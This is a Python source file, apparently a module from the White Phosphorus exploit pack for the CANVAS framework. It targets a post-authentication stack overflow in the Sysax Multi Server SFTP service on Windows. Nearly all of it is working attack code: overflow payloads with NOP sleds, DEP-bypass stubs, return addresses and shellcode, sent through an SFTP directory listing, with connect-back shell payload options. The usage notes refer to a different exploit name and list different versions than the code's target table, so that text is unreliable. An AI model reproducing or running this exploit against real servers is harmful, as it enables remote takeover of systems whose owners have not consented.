
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
import libs.paramiko as paramiko

######################################################################################
NAME = "Sysax Multi Server SFTP Service Post Auth Remote Overflow"
DESCRIPTION = "Exploits a post auth remote stack overflow in the Sysax Multi Server SFTP service"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Codeorigin, LLC'
DOCUMENTATION["Date public"] = "2010-06-22"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION["References"] = "http://www.secunia.com/advisories/40313/"
DOCUMENTATION["Notes"] = """
This exploit requires a valid username & password.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7", "2000"]

NOTES="""
WP> wp_sygate_pf_5.6
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./3rdparty/White_Phosphorus/exploits/wp_sysax_multiserver_sftp/wp_sysax_multiserver_sftp.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 22
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 SP1-SP2", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3", (0x00000000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other (Non DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.user = "anonymous"
        self.password = "anonymous"
        self.debug = False
        return

    def usage(self):
        self.wp_usage(targets,"-U <user>\t -P <password>")
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.log("WP> Confirming Sysax Multi Server SFTP service available")
        
        ret = 0
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        recv_str = s.recv(256)
            
        if ((recv_str.find("SysaxSSH_1.0")) > 0):
            self.log("WP> Service found")
            ret = 1
        else:
            self.log("WP> Service not found")
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password) 
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = ""
        if self.version == 1:
            depSc = self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
            depSc += self.shellcode
            payload = wp_randomnops(68)
            payload += depSc
            payload += wp_randomnops(70544 - len(depSc))
            payload += pack('<L', 0x0041AD1D)
            payload += "\r\n\r\n"
        if self.version == 2:
            depSc = self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8)
            depSc += self.shellcode
            payload = wp_randomnops(60)
            payload += depSc
            payload += wp_randomnops(70552 - len(depSc))
            payload += pack('<L', 0x0041AD1D)
            payload += "\r\n\r\n"
        if self.version == 3:
            payload += wp_randomnops(70603 - len(self.shellcode))
            payload += self.shellcode
            payload += "\xe9\xbc\xec\xff\xff"
            payload += "\xeb\xf9\xff\xff"
            payload += pack('<L', 0x00415544)
            payload += "\r\n\r\n"
        
        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            self.s = self.gettcpsock()
            self.s.connect((self.host, self.port))
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        try:
            self.log("WP> Setting up SSH transport")
            self.transport=paramiko.Transport(self.s)
        except:
            self.log("WP> Transport failed")
            return 0
        
        try:
            self.log("WP> Authenticating (%s:%s)"%(self.user, self.password))
            self.transport.connect(username=self.user,password=self.password)
            self.ssh_version=self.transport.remote_version
        except:
            self.log("WP> Authentication failed - if credentials valid rerun exploit")
            self.transport.close()
            self.s.close()
            return 0
        
        try:        
            sftp_ch = paramiko.SFTPClient.from_transport(self.transport)
        except:
            self.log("WP> Authentication failed - if credentials valid rerun exploit")
            self.transport.close()
            self.s.close()
            return 0
        
        try:
            content = sftp_ch.listdir(".")
        except:
            self.log("WP> Authentication Failed - if credentials valid rerun exploit")
            self.transport.close()
            self.s.close()
            return 0        
        self.log("WP> Authentication Complete")
         
        self.log("WP> Sending Exploit")
        try:
            sftp_ch.listdir(payload)
        except:
            self.log("WP> SSH Transport returned error on send - rerun exploit if payload not successful")
        
        time.sleep(3)
        
        self.transport.close()
        self.s.close()
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode()
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
